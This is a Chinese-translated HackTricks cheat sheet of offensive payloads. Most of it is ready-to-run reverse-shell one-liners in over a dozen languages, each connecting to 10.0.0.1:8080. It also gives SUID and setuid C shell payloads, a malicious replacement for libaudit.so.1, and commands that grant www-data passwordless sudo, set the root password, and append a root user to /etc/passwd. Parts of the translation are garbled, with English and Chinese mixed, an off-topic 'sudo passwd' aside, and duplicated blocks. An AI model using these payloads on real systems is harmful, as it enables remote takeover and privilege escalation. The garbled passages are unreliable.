# 执行负载

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks 仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud)提交 PR 来分享你的黑客技巧**。

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

### Shell

```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

```bash
0<&196;exec 196<>/dev/tcp/10.0.0.1/8080; sh <&196 >&196 2>&196
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PHP

```php
php -r '$sock=fsockopen("10.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("10.0.0.1",8080);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```bash
nc -e /bin/sh 10.0.0.1 8080
```

```bash
nc -e /bin/bash 10.0.0.1 8080
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### xterm

```bash
xterm -display 10.0.0.1:1
```

```bash
xterm -display 10.0.0.1:1 -e /bin/bash
```

### socat

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:8080
```

```bash
socat file:`tty`,raw,echo=0 tcp-listen:8080
```

### Telnet

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 10.0.0.1 8080 0/tmp/p
```

```bash
telnet 10.0.0.1 8080 | /bin/bash | telnet 10.0.0.1 8081
```

### PowerShell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Node.js

```javascript
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1');
```

```javascript
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1');
```

### Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

### MySQL

```sql
\! /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```sql
\! /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/8080"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
```

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/8080"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
```

### AWK (alternative)

```bash
awk 'BEGIN {system("/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")}'
```

```bash
awk 'BEGIN {system("/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")}'
```

### AWK (alternative)

```bash
awk 'BEGIN {system("/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\"")}'
```

```bash
awk 'BEGIN {system("/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\"")}'
```
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## 覆盖文件以提升权限

### 常见文件

* 在 _/etc/passwd_ 中添加带密码的用户
* 在 _/etc/shadow_ 中更改密码
* 在 _/etc/sudoers_ 中将用户添加到sudoers
* 通过docker套接字滥用docker，通常在 _/run/docker.sock_ 或 _/var/run/docker.sock_ 中

### 覆盖库文件

检查某个二进制文件使用的库文件，例如 `/bin/su`：
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
在这种情况下，让我们尝试冒充 `/lib/x86_64-linux-gnu/libaudit.so.1`。\
因此，检查 **`su`** 二进制文件使用的此库的函数：
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
符号`audit_open`、`audit_log_acct_message`、`audit_log_acct_message`和`audit_fd`可能来自于libaudit.so.1库。由于恶意共享库将覆盖libaudit.so.1，这些符号应该存在于新的共享库中，否则程序将无法找到符号并退出。
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
现在，只需调用 **`/bin/su`**，您将获得 root 权限的 shell。

## 脚本

您能让 root 执行某些操作吗？

### **将 www-data 添加到 sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **更改 root 密码**

To change the root password, you can use the following command:

要更改 root 密码，可以使用以下命令：

```bash
sudo passwd root
```

You will be prompted to enter the new password twice. After successfully changing the password, you can log in as root using the new password.
```bash
echo "root:hacked" | chpasswd
```
### 将新的root用户添加到/etc/passwd文件中

To add a new root user to the `/etc/passwd` file, you can follow these steps:

1. Open the `/etc/passwd` file using a text editor.
2. Locate the line that starts with `root` and copy it.
3. Paste the copied line at the end of the file.
4. Modify the username to a unique name for the new root user.
5. Change the user ID (UID) to `0` to assign root privileges.
6. Change the group ID (GID) to `0` to assign root group privileges.
7. Update the home directory and shell fields if necessary.
8. Save the changes and exit the text editor.

After completing these steps, you will have successfully added a new root user to the `/etc/passwd` file.
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
